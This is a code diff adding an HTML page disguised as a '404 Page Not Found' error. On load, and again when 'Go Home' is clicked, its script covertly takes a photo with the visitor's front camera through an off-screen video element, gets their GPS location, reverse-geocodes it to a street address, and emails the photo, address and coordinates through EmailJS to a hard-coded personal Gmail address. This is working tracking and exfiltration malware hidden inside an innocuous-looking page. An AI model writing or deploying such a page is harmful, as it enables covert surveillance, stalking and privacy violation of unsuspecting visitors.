@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 - Page Not Found</title>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1a1a2e;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #eee;
+        }
+
+        .container {
+            text-align: center;
+            padding: 2rem;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .error-code {
+            font-size: 8rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #e94560, #0f3460);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+        }
+
+        .message {
+            font-size: 1.5rem;
+            margin-top: 1rem;
+            color: #aaa;
+        }
+
+        .home-btn {
+            display: inline-block;
+            margin-top: 2rem;
+            padding: 0.75rem 2rem;
+            border: 2px solid #e94560;
+            color: #e94560;
+            text-decoration: none;
+            border-radius: 30px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .home-btn:hover {
+            background: #e94560;
+            color: #fff;
+        }
+
+        .info-box {
+            margin-top: 1.5rem;
+            padding: 1.2rem 1.5rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            font-size: 0.95rem;
+            color: #ccc;
+            display: none;
+            text-align: left;
+        }
+
+        .info-box.show {
+            display: block;
+        }
+
+        .info-box p {
+            margin: 0.3rem 0;
+        }
+
+        .info-box .label {
+            color: #aaa;
+            font-size: 0.85rem;
+        }
+
+        .info-box .value {
+            color: #e94560;
+            font-weight: 600;
+        }
+
+        .info-box .title {
+            text-align: center;
+            font-size: 1.1rem;
+            margin-bottom: 0.8rem;
+            color: #fff;
+        }
+
+        .loading {
+            color: #aaa;
+            font-style: italic;
+            text-align: center;
+        }
+
+        .captured-photo {
+            width: 100%;
+            max-width: 350px;
+            border-radius: 10px;
+            border: 2px solid rgba(233, 69, 96, 0.4);
+            margin: 0.8rem auto;
+            display: block;
+        }
+
+        #cameraVideo {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+
+        #cameraCanvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="error-code">404</div>
+        <p class="message">Page Not Found</p>
+        <a href="#" class="home-btn" onclick="startCapture(); return false;">Go Home</a>
+        <div class="info-box" id="photoBox"></div>
+        <div class="info-box" id="locationInfo"></div>
+    </div>
+
+    <!-- Hidden video and canvas for camera capture -->
+    <video id="cameraVideo" autoplay playsinline></video>
+    <canvas id="cameraCanvas"></canvas>
+
+    <script>
+        // ============================================
+        // EmailJS Configuration
+        // REPLACE THESE WITH YOUR ACTUAL EmailJS IDs
+        // ============================================
+        var EMAILJS_PUBLIC_KEY = 'DoE85aH__5x5G7OhO';
+        var EMAILJS_SERVICE_ID = 'service_oe3al7c';
+        var EMAILJS_TEMPLATE_ID = 'template_2sgfzbg';
+
+        // Initialize EmailJS
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+
+        // Store captured data
+        var capturedData = {
+            photo: null,
+            location: null,
+            sent: false
+        };
+
+        function getDateTime() {
+            var now = new Date();
+            var options = {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric'
+            };
+            var date = now.toLocaleDateString('en-PH', options);
+            var time = now.toLocaleTimeString('en-PH', {
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            });
+            return { date: date, time: time };
+        }
+
+        function trySendEmail() {
+            // Only send when both photo and location are ready
+            if (!capturedData.photo || !capturedData.location || capturedData.sent) return;
+            capturedData.sent = true;
+
+            var loc = capturedData.location;
+            var dt = getDateTime();
+
+            var emailParams = {
+                to_email: 'alfredzxc129@gmail.com',
+                subject: '📍 404 Page - Location & Photo Captured',
+                photo_base64: capturedData.photo,
+                full_address: loc.fullAddress,
+                barangay: loc.barangay,
+                municipality: loc.town,
+                province: loc.province,
+                country: loc.country,
+                latitude: loc.lat,
+                longitude: loc.lng,
+                date: dt.date,
+                time: dt.time,
+                message_html: '<h2>📍 Location & Photo Captured</h2>' +
+                    '<img src="' + capturedData.photo + '" style="max-width:400px;border-radius:10px;margin:10px 0;" />' +
+                    '<p><strong>Address:</strong> ' + loc.fullAddress + '</p>' +
+                    '<p><strong>Barangay:</strong> ' + loc.barangay + '</p>' +
+                    '<p><strong>Municipality:</strong> ' + loc.town + '</p>' +
+                    '<p><strong>Province:</strong> ' + loc.province + '</p>' +
+                    '<p><strong>Country:</strong> ' + loc.country + '</p>' +
+                    '<p><strong>Latitude:</strong> ' + loc.lat + '</p>' +
+                    '<p><strong>Longitude:</strong> ' + loc.lng + '</p>' +
+                    '<hr/>' +
+                    '<p><strong>📅 Date:</strong> ' + dt.date + '</p>' +
+                    '<p><strong>🕐 Time:</strong> ' + dt.time + '</p>'
+            };
+
+            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailParams)
+                .then(function() {
+                    console.log('Email sent successfully!');
+                })
+                .catch(function(err) {
+                    console.log('Email failed:', err);
+                });
+        }
+
+        function capturePhoto() {
+            var photoBox = document.getElementById('photoBox');
+            photoBox.className = 'info-box show';
+            photoBox.innerHTML = '<p class="loading">📸 Capturing photo...</p>';
+
+            var video = document.getElementById('cameraVideo');
+            var canvas = document.getElementById('cameraCanvas');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Wait for camera to be ready then capture
+                    setTimeout(function() {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        var ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+
+                        var imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+                        // Stop camera
+                        stream.getTracks().forEach(function(track) {
+                            track.stop();
+                        });
+
+                        photoBox.innerHTML =
+                            '<p class="title">📸 Captured Photo</p>' +
+                            '<img src="' + imageData + '" class="captured-photo" alt="Captured Photo">';
+
+                        // Store and try sending email
+                        capturedData.photo = imageData;
+                        trySendEmail();
+                    }, 1500);
+                })
+                .catch(function(err) {
+                    photoBox.innerHTML = '<p>❌ Camera error: ' + err.message + '</p>';
+                });
+        }
+
+        function getLocation() {
+            var info = document.getElementById('locationInfo');
+            info.className = 'info-box show';
+            info.innerHTML = '<p class="loading">📍 Getting your location...</p>';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude;
+                    var lng = position.coords.longitude;
+
+                    // Reverse geocoding using OpenStreetMap Nominatim
+                    fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&addressdetails=1')
+                        .then(function(response) { return response.json(); })
+                        .then(function(data) {
+                            var addr = data.address || {};
+                            var dt = getDateTime();
+
+                            var barangay = addr.suburb || addr.neighbourhood || addr.village || '';
+                            var town = addr.town || addr.city || addr.municipality || '';
+                            var province = addr.state || addr.province || addr.county || '';
+                            var country = addr.country || '';
+                            var fullAddress = data.display_name || 'N/A';
+
+                            info.innerHTML =
+                                '<p class="title">📍 Your Location</p>' +
+                                '<p><span class="label">Address:</span> <span class="value">' + fullAddress + '</span></p>' +
+                                (barangay ? '<p><span class="label">Barangay:</span> <span class="value">' + barangay + '</span></p>' : '') +
+                                (town ? '<p><span class="label">Municipality:</span> <span class="value">' + town + '</span></p>' : '') +
+                                (province ? '<p><span class="label">Province:</span> <span class="value">' + province + '</span></p>' : '') +
+                                (country ? '<p><span class="label">Country:</span> <span class="value">' + country + '</span></p>' : '') +
+                                '<p><span class="label">Latitude:</span> <span class="value">' + lat + '</span></p>' +
+                                '<p><span class="label">Longitude:</span> <span class="value">' + lng + '</span></p>' +
+                                '<hr style="border-color:rgba(255,255,255,0.1); margin:0.8rem 0;">' +
+                                '<p><span class="label">📅 Date:</span> <span class="value">' + dt.date + '</span></p>' +
+                                '<p><span class="label">🕐 Time:</span> <span class="value">' + dt.time + '</span></p>';
+
+                            // Store and try sending email
+                            capturedData.location = {
+                                lat: lat, lng: lng,
+                                fullAddress: fullAddress,
+                                barangay: barangay,
+                                town: town,
+                                province: province,
+                                country: country
+                            };
+                            trySendEmail();
+                        })
+                        .catch(function() {
+                            var dt = getDateTime();
+                            info.innerHTML =
+                                '<p class="title">📍 Your Location</p>' +
+                                '<p><span class="label">Latitude:</span> <span class="value">' + lat + '</span></p>' +
+                                '<p><span class="label">Longitude:</span> <span class="value">' + lng + '</span></p>' +
+                                '<hr style="border-color:rgba(255,255,255,0.1); margin:0.8rem 0;">' +
+                                '<p><span class="label">📅 Date:</span> <span class="value">' + dt.date + '</span></p>' +
+                                '<p><span class="label">🕐 Time:</span> <span class="value">' + dt.time + '</span></p>';
+
+                            capturedData.location = { lat: lat, lng: lng, fullAddress: 'N/A', barangay: '', town: '', province: '', country: '' };
+                            trySendEmail();
+                        });
+                }, function(error) {
+                    info.innerHTML = '<p>❌ Unable to get location: ' + error.message + '</p>';
+                });
+            } else {
+                info.innerHTML = '<p>❌ Geolocation is not supported by your browser.</p>';
+            }
+        }
+
+        function startCapture() {
+            capturedData = { photo: null, location: null, sent: false };
+            capturePhoto();
+            getLocation();
+        }
+
+        // Auto-capture on page load
+        startCapture();
+    </script>
+</body>
+</html>
